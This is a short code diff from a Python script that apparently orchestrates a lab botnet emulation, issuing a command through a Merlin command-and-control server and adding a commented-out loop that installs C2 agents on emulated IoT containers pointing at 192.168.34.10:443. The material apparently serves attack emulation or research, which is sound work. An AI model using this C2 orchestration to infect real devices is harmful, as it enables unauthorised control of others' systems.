@@ -153,3 +153,10 @@ time.sleep(30)
 
 merlin_cnc_remote_cmd_agent(merlin_cnc_h, merlin_cnc_p, agent_list[0][0], "chmod 775 /opt/hping3")
 
+
+# infect all iot
+# for iot_target in all_iot:
+#     print(f"* Infecting: {iot_target.name}")
+#     container_bot = docker_client.containers.get(get_node_docker_container_id(server, project, iot_target.id))
+#     exec_merlin_agent(container_bot, "192.168.34.10", 443, 60)
+#     time.sleep(2)
